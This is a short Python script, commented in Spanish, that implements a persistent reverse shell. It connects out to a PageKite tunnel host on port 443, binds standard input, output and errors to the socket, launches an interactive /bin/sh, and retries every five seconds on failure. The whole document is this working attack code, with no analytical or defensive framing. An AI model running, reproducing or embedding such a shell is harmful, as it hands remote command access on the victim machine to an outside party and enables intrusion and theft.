import socket
import subprocess
import os
import time

while True:
    try:
        # Configura el socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("tachitunel.pagekite.me", 443))  # URL y puerto del túnel

        # Redirige la entrada, salida y errores estándar al socket
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)

        # Usa un shell interactivo sin cerrar la conexión
        p = subprocess.Popen(["/bin/sh", "-i"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())
        p.wait()
        break
    except Exception as e:
        print(f"Error: {e}. Reintentando en 5 segundos...")
        time.sleep(5)
